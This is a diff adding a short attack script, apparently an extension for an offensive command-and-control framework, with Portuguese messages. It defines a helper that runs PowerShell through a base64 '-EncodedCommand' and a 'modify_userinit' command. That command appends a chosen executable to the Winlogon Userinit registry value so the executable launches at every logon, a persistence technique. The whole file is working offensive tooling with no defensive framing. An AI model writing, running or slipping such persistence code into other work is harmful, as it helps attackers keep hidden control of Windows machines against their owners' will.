@@ -1,0 +1,31 @@
+sub powershell_execute {
+    local('$output $ps_command $encoded_command');
+
+    $ps_command = $_[0];
+    $encoded_command = base64_encode(utf16le($ps_command));
+    $output = shell_exec("powershell -EncodedCommand $encoded_command");
+
+    return $output;
+}
+
+sub modify_userinit {
+    local('$CustomExePath $script');
+
+    $CustomExePath = "C:\caminho\para\o\arquivo.exe";
+    $script = qq{
+        \$CustomExePath = "$CustomExePath";
+        if (Test-Path \$CustomExePath) {
+            \$RegistryPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
+            \$Current_Userinit = Get-ItemProperty -Path \$RegistryPath -Name Userinit | Select-Object -ExpandProperty Userinit;
+            \$New_Userinit = \$Current_Userinit.TrimEnd(',') + ',' + \$CustomExePath;
+            Set-ItemProperty -Path \$RegistryPath -Name Userinit -Value \$New_Userinit;
+            "O valor do registro Userinit foi atualizado para incluir: $CustomExePath"
+        } else {
+            "O arquivo .exe não foi encontrado no caminho especificado: $CustomExePath"
+        }
+    };
+
+    return powershell_execute($script);
+}
+
+command "modify_userinit", "modify_userinit";
